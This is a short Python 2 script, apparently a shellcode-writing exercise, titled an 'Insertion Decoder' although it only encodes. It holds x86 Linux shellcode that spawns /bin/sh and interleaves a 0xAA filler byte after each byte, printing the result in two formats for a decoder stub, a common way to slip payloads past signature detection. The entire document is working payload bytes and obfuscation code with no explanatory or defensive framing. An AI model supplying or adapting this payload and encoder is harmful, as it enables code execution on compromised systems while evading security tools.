#!/usr/bin/python

# Python Insertion Decoder

shellcode = ("\x31\xdb\xf7\xe3\x31\xc9\xeb\x05\x5b\xb0\x0b\xcd\x80\xe8\xf6\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68")

encoded = ""
encoded2 = ""

print 'Encoded shellcode...'

for x in bytearray(shellcode) :
	encoded += '\\x'
	encoded += '%02x' % x
	encoded += '\\x%02x' % 0xAA

	#encoded += '\\x%02x' % random.randint(1,255)

	encoded2 += '0x'
	encoded2 += '%02x,' % x
	encoded2 += '0x%02x,' % 0xAA	

	#encoded += '0x%02x,' % random.randint(1,255)	

print encoded
print "\n"
print encoded2

print len(encoded2)